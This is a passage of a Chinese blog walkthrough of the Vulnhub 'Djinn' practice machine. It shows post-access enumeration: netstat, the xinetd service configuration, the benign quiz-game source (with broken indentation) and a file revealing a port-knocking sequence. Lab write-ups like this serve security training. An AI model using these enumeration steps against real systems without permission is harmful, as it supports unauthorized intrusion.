+if __name__ == &quot;__main__&quot;:
+
+  main(options())</code></pre><p>可以再看下 1337端口的服务是怎么运行的</p>
+<p> netstat -tnlp </p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/21.png" alt></p>
+<p>Locate xinetd查询服务</p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/22.png" alt></p>
+<p>查看文件</p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/23.png" alt></p>
+<p>定位到 /etc/xinetd.d</p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/24.png" alt></p>
+<p>查看game 程序</p>
+<p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/25.png" alt></p>
+<p> 定位到 /opt/1337/run_challenge.sh </p>
+<p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/26.png" alt></p>
+<p>查看最终的程序:</p>
+<pre><code>#!/usr/bin/env python3                                                                                                         
+import sys                                                                                                 
+
+from random import choice, randint
+
+from pyfiglet import print_figlet
+
+def add(a,b): return a+b
+
+def div(a,b): return int(a/b)
+
+def multiply(a,b): return a*b
+
+def sub(a,b): return a-b
+
+print_figlet(&quot;Game Time&quot;)
+
+print(&quot;Let&#39;s see how good you are with simple maths&quot;)
+
+print(&quot;Answer my questions 1000 times and I&#39;ll give you your gift.&quot;)
+
+OPERATIONS = [&#39;+&#39;, &#39;-&#39;, &quot;/&quot;, &quot;*&quot;]
+
+def main():
+
+
+
+  for i in range(1001):
+
+
+
+​    a = randint(1,9)
+
+
+
+​    b = randint(1,9)
+
+
+
+​    op = choice(OPERATIONS)
+
+
+
+  print(a,op,b)
+
+
+
+​    if op == &quot;+&quot;:
+
+
+
+​      val = add(a,b)
+
+
+
+​    if op == &quot;-&quot;:
+
+
+
+​      val = sub(a,b)
+
+
+
+​    if op == &quot;/&quot;:
+
+
+
+​      val = div(a,b)
+
+
+
+​    if op == &quot;*&quot;:
+
+
+
+​      val = multiply(a,b)
+
+
+
+​    try:
+
+
+
+​      In = int(input(&quot;&gt; &quot;))
+
+
+
+​    except Exception:
+
+
+
+​      print(&quot;Stop acting like a hacker for a damn minute!!&quot;)
+
+
+
+​      sys.exit(1)
+
+
+
+​    if In == val:
+
+
+
+​      continue
+
+
+
+​    else:
+
+
+
+​      print(&quot;Wrong answer&quot;)
+
+
+
+​      sys.exit(1)
+
+
+
+  with open(&quot;/opt/1337/p0rt5&quot;, &#39;r&#39;) as f:
+
+
+
+​    print(f.read())
+
+
+
+if __name__ == &quot;__main__&quot;:
+
+
+
+  main()</code></pre><p> 查看/opt/1337/p0rt5 :</p>
+<p>Here is your gift, I hope you know what to do with it:</p>
+<p>1356, 6784, 3409</p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/" title="Vulnhub靶场做题记录-Djiin" target="_blank" rel="external">http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/1eng" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/1eng" target="_blank"><span class="text-dark">1eng</span><small class="ml-1x">Information Security &amp; Student</small></a></h3>
+        <div>菜鸡一枚,哪位大佬收了我当挂件|···|</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/Vulnhub%E9%9D%B6%E5%9C%BA/11/" title="Vulnhub靶场做题记录-haclabs-no_name"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/Vulnhub%E9%9D%B6%E5%9C%BA/9/" title="Vulnhub靶场做题记录-Connect-the-dots"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">
+        <span>[&nbsp;</span><span>文章目录</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/1eng" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://twitter.com/markwhile1" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'O0twhlXmhDaIrHEXxY8FBeB1-gzGzoHsz',
+    appKey: 'pIcHWaOiHXkAi1fMo3UsumkV',
+    placeholder: 'Ask your question, let&#39;s solve it together',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
